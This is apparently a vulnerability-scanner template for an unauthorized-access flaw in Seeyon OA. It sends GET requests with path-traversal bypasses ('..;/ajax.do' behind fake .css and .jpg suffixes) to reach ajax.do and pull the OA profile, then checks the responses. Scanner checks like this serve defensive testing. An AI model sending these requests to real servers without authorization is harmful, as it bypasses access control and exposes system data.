id: poc-yaml-seeyon-ajax-unauthorized-access
info:
  name: Seeyon Ajaxorized Access 未授权访问漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Seeyon Ajaxorized
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /seeyon/thirdpartyController.do.css/..;/ajax.do
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "java.lang.NullPointerException:null")
  output: []
- method: GET
  path: /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "MMOneProfile") && contains(body,
    "productTags") && contains(body, "serverIdentifier") && contains(headers, "content-type")
    && contains(headers, "application/json")
  output: []
